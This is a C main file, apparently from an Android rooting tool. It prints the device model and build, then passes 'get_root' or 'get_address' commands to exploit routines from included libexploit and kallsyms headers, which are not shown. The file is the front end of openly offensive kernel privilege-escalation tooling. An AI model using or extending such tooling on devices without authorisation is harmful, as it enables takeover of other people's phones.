#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <sys/system_properties.h>
#include "device_database.h"
#include "cred.h"
#include "mm.h"
#include "ptmx.h"
#include "libexploit/exploit.h"
#include "libkallsyms/kallsyms_in_memory.h"
#include <sys/mount.h>

static int print_help(const char* cmd) {
    printf("Usage\n");
    printf("> Try privilege escalation:\n");
    printf("%s get_root\n", cmd);
    printf("\n");
    printf("> Get symbol address:\n");
    printf("%s get_address\n", cmd);
    return 1;
}

void
device_detected(void) {
    char device[PROP_VALUE_MAX];
    char build_id[PROP_VALUE_MAX];

    __system_property_get("ro.product.model", device);
    __system_property_get("ro.build.display.id", build_id);

    printf("\n\nDevice detected: %s (%s)\n\n", device, build_id);
    return;
}

int main(int argc, char **argv) {

    if (argc == 2 && strcmp(argv[1], "get_root") == 0) {
        return get_root();
    } else if (argc == 2 && strcmp(argv[1], "get_address") == 0) {
        return get_address();
    }

    return print_help(argv[0]);
}
